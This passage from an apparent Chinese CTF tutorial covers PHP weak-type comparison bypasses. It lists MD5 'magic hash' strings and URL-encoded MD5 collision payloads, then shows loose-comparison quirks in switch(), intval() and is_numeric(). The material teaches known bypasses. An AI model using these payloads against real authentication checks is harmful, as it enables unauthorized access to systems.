class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//一些比较常用的MD5弱比较：</span><br>QNKCDZO<br><span class="hljs-number">0e830400451993494058024219903391</span><br><span class="hljs-number">240610708</span><br><span class="hljs-number">0e462097431906509019562988736854</span><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><span class="hljs-comment">//MD5硬碰撞</span><br>a=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>&amp;b=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%<span class="hljs-number">5</span>f%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%f3%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%e9%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">13</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%a8%<span class="hljs-number">1</span>b%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%<span class="hljs-number">39</span>%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>&amp;c=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%ed%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%a7%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%e6%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">16</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%<span class="hljs-number">33</span>%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%<span class="hljs-number">6</span>f%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br></code></pre></td></tr></table></figure><p>在PHP中有些函数会在内部“使用”弱相等，比如switch()、in_array()等函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//switch()函数</span><br><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;2abc&#x27;</span>;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$a</span>)&#123;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">//这里是弱比较</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-comment">//同上</span><br>  <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//结果会输出2</span><br>    <br><span class="hljs-comment">//intval()函数:将传入的参数转换为整数。如果参数是一个字符串，它会尝试将字符串中的数字部分提取出来并转换为整数。如果参数是浮点数，它会将浮点数截断为整数。如果参数是其他类型的值，它会尝试将其转换为整数。**这个漏洞已经被修复了，用未修复前的版本举个栗子**</span><br><span class="hljs-comment">//它不能用于 object，否则会产生 E_NOTICE 错误并返回 1（注意这个通常配合preg_match来使用）</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$num</span>=<span class="hljs-number">2e4</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$num</span>; <span class="hljs-comment">//20000</span><br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>);<span class="hljs-comment">//2</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>&lt;<span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>+<span class="hljs-number">1</span>)&gt;<span class="hljs-number">2021</span>)&#123;<span class="hljs-comment">//让一个变量intval后小于2020但是加一在intval会大于2021，2e4就是一个理想的值</span><br><br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;hello world!&#x27;</span>;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//输出hello world!</span><br><span class="hljs-comment">//同理还可以用0x开头的十六进制、0开头的八进制进行一些绕过</span><br><br><span class="hljs-comment">//is_numeric() 函数的作用是判断给定的值是否为数字或数字字符串。如果值是数字或可以解析为数字的字符串，则返回 true；否则返回 false。</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">123</span>));<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123&#x27;</span>)); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123.0&#x27;</span>)); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">0x776179</span>));<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;0x776179&#x27;</span>));<span class="hljs-comment">//flase</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span 